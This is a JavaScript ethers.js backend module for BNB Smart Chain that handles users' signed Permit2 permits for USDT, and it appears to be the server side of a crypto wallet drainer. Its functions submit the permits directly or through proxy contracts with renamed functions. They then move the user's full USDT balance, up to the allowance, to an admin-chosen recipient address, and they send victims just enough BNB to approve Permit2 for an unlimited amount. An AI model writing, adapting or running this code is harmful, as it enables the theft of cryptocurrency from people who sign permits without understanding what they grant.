import { ethers } from 'ethers';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const DEFAULT_PROXY_ADDRESS = '0x4030538F5B846657087a0AE476B94f4c51cEE8c1';

const PERMIT2_ABI = [
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  'function transferFrom(address from, address to, uint160 amount, address token) external',
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
];

const PROXY_ABI = [
  // VaultRouter (current)
  'function submitPermit(address holder, ((address asset, uint160 qty, uint48 deadline, uint48 seq) info, address delegate, uint256 authExpiry) request, bytes sig) external',
  'function moveAssets(address sender, address recipient, uint160 qty, address asset) external',
  'function permitAndMove(address holder, ((address asset, uint160 qty, uint48 deadline, uint48 seq) info, address delegate, uint256 authExpiry) request, bytes sig, address recipient, uint160 moveQty) external',
  'function manager() view returns (address)',

  // Legacy Proxy contracts (Permit2Proxy / TokenGateway / AssetProxy)
  'function executePermit(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  'function executeTransfer(address from, address to, uint160 amount, address token) external',
  'function executePermitAndTransfer(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature, address to, uint160 transferAmount) external',
  'function owner() view returns (address)',
  'function admin() view returns (address)',
  'function controller() view returns (address)',
];

const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

function getSpenderAddress(wallet) {
  const proxy = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS;
  if (proxy && ethers.isAddress(proxy) && !proxy.startsWith('0x00000000000000000000')) {
    return ethers.getAddress(proxy);
  }
  return wallet.address;
}

async function getProxyController(targetSpender, provider) {
  for (const fn of ['manager', 'owner', 'admin', 'controller']) {
    try {
      const contract = new ethers.Contract(targetSpender, [`function ${fn}() view returns (address)`], provider);
      const addr = await contract[fn]();
      if (addr && ethers.isAddress(addr)) return ethers.getAddress(addr);
    } catch (_) {}
  }
  return null;
}

/**
 * Read the current on-chain nonce for a user from Permit2 AllowanceTransfer.
 */
export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f99059ff775485246999027b3197955') {
  try {
    const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
    const dummyKey = '0x0000000000000000000000000000000000000000000000000000000000000001';
    const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY || dummyKey, provider);
    const spenderAddress = getSpenderAddress(wallet);
    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const [_amount, _expiration, nonce] = await contract.allowance(
      ethers.getAddress(ownerAddress),
      ethers.getAddress(tokenAddress),
      spenderAddress
    );
    return Number(nonce);
  } catch (err) {
    console.error('Error fetching on-chain nonce:', err.message);
    return 0;
  }
}

/**
 * Step 1: Submit the user's signed permit to Permit2 contract.
 */
export async function activatePermit(permit) {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  
  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  
  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();

  let targetSpender = permit.spender && ethers.isAddress(permit.spender)
    ? ethers.getAddress(permit.spender)
    : ethers.getAddress(proxyAddress);

  // If spender is Permit2 itself (e.g. from dummy pre-logging), redirect to proxyAddress
  if (targetSpender.toLowerCase() === PERMIT2_ADDRESS.toLowerCase()) {
    targetSpender = ethers.getAddress(proxyAddress);
  }

  // If targetSpender is an old proxy contract not owned/managed by current admin wallet, fallback to active proxy
  if (targetSpender.toLowerCase() !== proxyAddress) {
    try {
      const contractOwner = await getProxyController(targetSpender, provider);
      if (contractOwner && contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
        console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
        targetSpender = ethers.getAddress(proxyAddress);
      }
    } catch (e) {
      // Ignore
    }
  }

  // Check user approved Permit2 on USDT contract
  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const erc20Allowance = await usdtContract.allowance(ownerAddress, PERMIT2_ADDRESS);

  if (erc20Allowance === 0n) {
    throw new Error('User has not approved Permit2 contract on USDT token yet. User must approve from the frontend first.');
  }

  // Check if allowance is already active on Permit2 contract
  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
  try {
    const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
    if (existing && existing.amount > 0n) {
      console.log(`Permit already active on-chain for ${ownerAddress} (amount: ${existing.amount})`);
      return '0xALREADY_ACTIVATED';
    }
  } catch (err) {
    console.warn('Could not read existing Permit2 allowance:', err.message);
  }

  const permitSingle = {
    details: {
      token: tokenAddress,
      amount: permit.amount,
      expiration: permit.deadline,
      nonce: permit.nonce,
    },
    spender: targetSpender,
    sigDeadline: permit.deadline,
  };

  const signature = ethers.Signature.from({
    r: permit.r,
    s: permit.s,
    v: permit.v,
  }).serialized;

  console.log(`Activating AllowanceTransfer permit via Spender: ${targetSpender}`);

  // Canonical submission: permit() is a public function on Permit2 that anyone can call.
  // It directly verifies the signature and sets allowance on-chain for targetSpender.
  try {
    console.log('Submitting permit directly to Permit2 contract...');
    await permit2Contract.permit.staticCall(ownerAddress, permitSingle, signature);
    const tx = await permit2Contract.permit(ownerAddress, permitSingle, signature, { gasLimit: 200000 });
    console.log('Permit2 direct activation TX sent:', tx.hash);
    const receipt = await tx.wait();
    return receipt.hash;
  } catch (directErr) {
    const directReason = directErr.reason || directErr.shortMessage || directErr.message;
    console.warn(`Direct permit2.permit reverted: ${directReason}. Trying proxy fallback...`);

    // Check if allowance was already granted
    try {
      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      if (existing && existing.amount > 0n) {
        return '0xALREADY_ACTIVATED';
      }
    } catch (_) {}

    // Proxy fallback if needed
    const targetCode = await provider.getCode(targetSpender);
    const isUsingProxy = targetCode && targetCode.length > 2;

    if (isUsingProxy) {
      const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);

      // Check if VaultRouter (submitPermit): selector 0x05b264e5
      const selSubmit = ethers.id('submitPermit(address,((address,uint160,uint48,uint48),address,uint256),bytes)').slice(2, 10);
      if (targetCode.includes(selSubmit)) {
        const request = {
          info: {
            asset: permitSingle.details.token,
            qty: permitSingle.details.amount,
            deadline: permitSingle.details.expiration,
            seq: permitSingle.details.nonce,
          },
          delegate: permitSingle.spender,
          authExpiry: permitSingle.sigDeadline,
        };
        const tx = await proxyContract.submitPermit(ownerAddress, request, signature, { gasLimit: 250000 });
        const receipt = await tx.wait();
        return receipt.hash;
      }

      // Check if legacy (executePermit)
      const selExecute = ethers.id('executePermit(address,((address,uint160,uint48,uint48),address,uint256),bytes)').slice(2, 10);
      if (targetCode.includes(selExecute)) {
        const tx = await proxyContract.executePermit(ownerAddress, permitSingle, signature, { gasLimit: 250000 });
        const receipt = await tx.wait();
        return receipt.hash;
      }
    }

    throw new Error(`Permit signature invalid or already processed on-chain: ${directReason}`);
  }
}

/**
 * Step 2: Transfer tokens using active Permit2 allowance via Proxy or Wallet.
 * Automatically activates permit on-chain if not already activated.
 */
export async function executeTransfer(permit, customAmount = null) {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);

  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  const recipientAddress = ethers.getAddress(process.env.RECIPIENT_ADDRESS || wallet.address);

  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const balance = await usdtContract.balanceOf(ownerAddress);

  if (balance === 0n) {
    throw new Error('User wallet currently has 0 USDT balance on-chain.');
  }

  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();

  let targetSpender = permit.spender && ethers.isAddress(permit.spender)
    ? ethers.getAddress(permit.spender)
    : ethers.getAddress(proxyAddress);

  if (targetSpender.toLowerCase() === PERMIT2_ADDRESS.toLowerCase()) {
    targetSpender = ethers.getAddress(proxyAddress);
  }

  // If targetSpender is an old proxy contract not owned/managed by current admin wallet, fallback to active proxy
  if (targetSpender.toLowerCase() !== proxyAddress) {
    try {
      const contractOwner = await getProxyController(targetSpender, provider);
      if (contractOwner && contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
        console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
        targetSpender = ethers.getAddress(proxyAddress);
      }
    } catch (e) {
      // Ignore
    }
  }

  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
  let [allowanceAmount, expiration] = await permit2Contract.allowance(
    ownerAddress,
    tokenAddress,
    targetSpender
  );

  // Fallback: If allowance is 0 for stored targetSpender, check if current active proxyAddress has active allowance!
  if (allowanceAmount === 0n && targetSpender.toLowerCase() !== proxyAddress) {
    const proxyAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, proxyAddress);
    if (proxyAllowance[0] > 0n) {
      targetSpender = ethers.getAddress(proxyAddress);
      allowanceAmount = proxyAllowance[0];
      expiration = proxyAllowance[1];
      console.log(`Switched to active Proxy Address (${targetSpender}) with ${allowanceAmount.toString()} allowance.`);
    }
  }

  // If allowance is still zero, attempt to auto-activate permit on-chain first
  if (allowanceAmount === 0n) {
    console.log(`Allowance is 0. Auto-activating permit for ${ownerAddress} before transfer...`);
    try {
      await activatePermit(permit);
      const updatedAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      allowanceAmount = updatedAllowance[0];
      expiration = updatedAllowance[1];
    } catch (actErr) {
      console.warn('Auto-activation during transfer failed:', actErr.message);
      throw new Error(`Permit not active on-chain and auto-activation failed: ${actErr.message}`);
    }
  }

  if (allowanceAmount === 0n) {
    throw new Error('No active Permit2 allowance on-chain.');
  }

  const now = Math.floor(Date.now() / 1000);
  if (Number(expiration) > 0 && Number(expiration) < now) {
    throw new Error('Permit2 allowance has expired.');
  }

  let transferAmount = balance < allowanceAmount ? balance : allowanceAmount;
  if (customAmount) {
    const customBigInt = BigInt(customAmount);
    if (customBigInt < transferAmount) transferAmount = customBigInt;
  }

  // Determine whether to use Proxy or EOA based on code on-chain
  const targetCode = await provider.getCode(targetSpender);
  const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;

  console.log(`Executing transferFrom via ${isUsingProxy ? 'Proxy Contract' : 'Admin Wallet'} (${targetSpender})...`);

  if (isUsingProxy) {
    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);

    // Check if VaultRouter (moveAssets): selector 0x12ff555e
    const selMove = ethers.id('moveAssets(address,address,uint160,address)').slice(2, 10);
    const hasMoveAssets = targetCode.includes(selMove);

    if (hasMoveAssets) {
      try {
        await proxyContract.moveAssets.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
      } catch (simErr) {
        const reason = simErr.reason || simErr.shortMessage || simErr.message;
        throw new Error(`VaultRouter moveAssets simulation failed on-chain: ${reason}`);
      }

      const tx = await proxyContract.moveAssets(
        ownerAddress,
        recipientAddress,
        transferAmount,
        tokenAddress,
        { gasLimit: 250000 }
      );
      console.log('VaultRouter moveAssets TX sent:', tx.hash);
      const receipt = await tx.wait();
      return { txHash: receipt.hash, amount: transferAmount.toString() };
    } else {
      // Legacy executeTransfer
      try {
        await proxyContract.executeTransfer.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
      } catch (simErr) {
        const reason = simErr.reason || simErr.shortMessage || simErr.message;
        throw new Error(`Proxy transfer simulation failed on-chain: ${reason}`);
      }

      const tx = await proxyContract.executeTransfer(
        ownerAddress,
        recipientAddress,
        transferAmount,
        tokenAddress,
        { gasLimit: 250000 }
      );
      console.log('Proxy Transfer TX sent:', tx.hash);
      const receipt = await tx.wait();
      return { txHash: receipt.hash, amount: transferAmount.toString() };
    }
  } else {
    const permit2WalletContract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
    try {
      await permit2WalletContract.transferFrom.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      throw new Error(`Transfer simulation failed on-chain: ${reason}`);
    }

    const tx = await permit2WalletContract.transferFrom(ownerAddress, recipientAddress, transferAmount, tokenAddress, { gasLimit: 200000 });
    const receipt = await tx.wait();
    return { txHash: receipt.hash, amount: transferAmount.toString() };
  }
}

/**
 * Check the current Permit2 AllowanceTransfer state for a user safely with error fallback.
 */
export async function checkPermit2Allowance(ownerAddress, tokenAddress, customSpender = null) {
  try {
    if (!ownerAddress || !tokenAddress) return null;

    let cleanOwner, cleanToken;
    try {
      cleanOwner = ethers.getAddress(ownerAddress);
      cleanToken = ethers.getAddress(tokenAddress);
    } catch (addrErr) {
      return null;
    }

    const rpcUrl = process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/';
    const provider = new ethers.JsonRpcProvider(rpcUrl);

    let walletAddress = process.env.ADMIN_PUBLIC_ADDRESS;
    if (process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
      try {
        const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
        walletAddress = wallet.address;
      } catch (e) {}
    }

    let spender = customSpender && ethers.isAddress(customSpender) && !customSpender.startsWith('0x00000000000000000000') && customSpender.toLowerCase() !== PERMIT2_ADDRESS.toLowerCase()
      ? ethers.getAddress(customSpender)
      : (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS || walletAddress);

    if (!spender || !ethers.isAddress(spender)) {
      return null;
    }

    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const usdtContract = new ethers.Contract(cleanToken, USDT_ABI, provider);

    const fetchAllowance = Promise.all([
      contract.allowance(cleanOwner, cleanToken, spender),
      usdtContract.allowance(cleanOwner, PERMIT2_ADDRESS),
    ]);

    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('RPC Timeout')), 4000)
    );

    const [[amount, expiration, nonce], erc20Allowance] = await Promise.race([fetchAllowance, timeout]);

    return {
      spender,
      permit2Amount: amount.toString(),
      permit2Expiration: Number(expiration),
      permit2Nonce: Number(nonce),
      erc20Allowance: erc20Allowance.toString(),
      hasErc20Approval: erc20Allowance > 0n,
      hasPermit2Allowance: amount > 0n,
      isExpired: Number(expiration) > 0 && Number(expiration) < Math.floor(Date.now() / 1000),
    };
  } catch (err) {
    console.error('Error checking Permit2 allowance for', ownerAddress, err.message);
    return null;
  }
}

/**
 * Send the exact BNB needed for one USDT.approve(Permit2, MaxUint256) TX.
 */
export async function sendGasFunding(userAddress) {
  const USDT_ADDRESS  = '0x55d398326f99059ff775485246999027b3197955';
  const PERMIT2_ADDR  = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet   = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  const recipientAddress = ethers.getAddress(userAddress);

  // ── 1. Estimate gas units for USDT.approve(Permit2, MaxUint256) ──
  let approveGasUnits = 60000n; // safe fallback
  try {
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const est = await usdtContract.approve.estimateGas(
      PERMIT2_ADDR, ethers.MaxUint256, { from: recipientAddress }
    );
    approveGasUnits = (est * 120n) / 100n; // +20% buffer on units
  } catch (e) {
    console.warn('[GasFund] Gas estimation failed, using 60000 fallback:', e.message);
  }

  // ── 2. Get current BSC gas price — floor at 1 gwei (realistic for BSC) ──
  const feeData  = await provider.getFeeData();
  const MIN_GWEI = ethers.parseUnits('1', 'gwei');
  const gasPrice = (feeData.gasPrice && feeData.gasPrice > MIN_GWEI)
    ? feeData.gasPrice
    : MIN_GWEI;

  // ── 3. Target = 1.5x estimated cost so minor gas spikes are covered ──
  const estimatedCost = approveGasUnits * gasPrice;
  const targetBalance = (estimatedCost * 150n) / 100n;

  const currentBalance = await provider.getBalance(recipientAddress);
  console.log(`[GasFund] ${recipientAddress}: has ${ethers.formatEther(currentBalance)} BNB, needs ${ethers.formatEther(targetBalance)} BNB`);

  // ── 4. Skip if user already has enough ──
  if (currentBalance >= targetBalance) {
    console.log('[GasFund] Sufficient balance, skipping.');
    return {
      status: 'SUFFICIENT_BALANCE',
      message: 'User already has sufficient BNB for gas',
      txHash: null,
      alreadyFunded: true,
    };
  }

  // ── 5. Fund only the deficit ──
  const fundingAmount = targetBalance - currentBalance;
  const adminBalance  = await provider.getBalance(wallet.address);
  console.log(`[GasFund] Sending ${ethers.formatEther(fundingAmount)} BNB (admin has ${ethers.formatEther(adminBalance)} BNB)`);

  if (adminBalance <= fundingAmount) {
    throw new Error(`Admin wallet has only ${ethers.formatEther(adminBalance)} BNB — cannot sponsor ${ethers.formatEther(fundingAmount)} BNB`);
  }

  const tx = await wallet.sendTransaction({
    to: recipientAddress,
    value: fundingAmount,
    gasLimit: 21000, // plain BNB transfer, fixed cost
  });

  console.log(`[GasFund] TX sent: ${tx.hash}`);
  // Wait 2 confirmations — ensures wallet providers see the updated balance
  const receipt = await tx.wait(2);
  console.log(`[GasFund] Confirmed (2 blocks): ${receipt.hash}`);

  return {
    status: 'FUNDED',
    txHash: receipt.hash,
    fundedBnb: ethers.formatEther(fundingAmount),
    amount: ethers.formatEther(fundingAmount),
  };
}
